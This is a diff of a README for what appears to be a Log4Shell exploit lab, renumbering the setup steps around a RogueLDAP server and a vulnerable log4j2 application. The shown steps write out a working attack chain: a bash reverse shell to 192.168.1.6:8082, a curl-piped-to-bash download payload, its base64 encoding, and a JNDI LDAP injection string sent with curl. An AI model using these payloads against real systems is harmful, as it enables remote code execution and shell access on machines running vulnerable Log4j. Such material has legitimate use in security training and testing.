@@ -40,7 +40,7 @@ mvn clean package && java -Dlog4j2.contextSelector=org.apache.logging.log4j.core
 
 ## Setting up the Environment
 
-The setup should be as follows 
+In order to setup the environment and run the exploit the following steps should be followed 
 
 1. Open a new terminal window and run the ```RogueLDAP``` server at the attacking machine
 2. Open a new terminal window and run the vulnerable ```logging-log4j2``` application at the target machine
@@ -51,38 +51,38 @@ mkdir shells
 cd shells 
 ```
 
-Inside the shells folder create an ```index.html``` file 
+4. Inside the shells folder create an ```index.html``` file 
 
 ```
 touch index.html 
 ```
 
-Inside the ```index.html``` file put the following payload and change the IP address to the one that suits to your environment
+5. Inside the ```index.html``` file put the following payload and change the IP address to the one that suits to your environment
 
 ``` 
 /bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.1.6/8082 0>&1" &
 ``` 
 
-4. convert the payload ```$(curl 192.168.1.6:8085|bash)``` in base64 format as seen below (change the IP address with the one that suits to your environment) 
+6. convert the payload ```$(curl 192.168.1.6:8085|bash)``` in base64 format as seen below (change the IP address with the one that suits to your environment) 
 
 ```
 JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=
 ```
 
-5. In order to perform a JNDI LDAP query the following payload will be used (change the IP address with the one that suits to your environment) 
+7. In order to perform a JNDI LDAP query the following payload will be used (change the IP address with the one that suits to your environment) 
 
 ```
 ${jndi:ldap://192.168.1.6:6389/JChjdXJsIDE5Mi4xNjguMS42OjgwODV8YmFzaCk=}
 ``` 
 
-6. Now open a new terminal window and inside the shells directory run the following command in order to start a python simple HTTP server
+7. Now open a new terminal window and inside the shells directory run the following command in order to start a python simple HTTP server
 
 ```
 cd shells 
 python3 -m http.server 8085
 ```
 
-7. Now that the ```logging-log4j2``` application runs, open a new terminal window and run the ```curl``` command line tool in order to send the jndi payload as shown below 
+8. Now that the ```logging-log4j2``` application runs, open a new terminal window and run the ```curl``` command line tool in order to send the jndi payload as shown below 
 (change the IP address with the one that suits to your environment) 
 
 ```
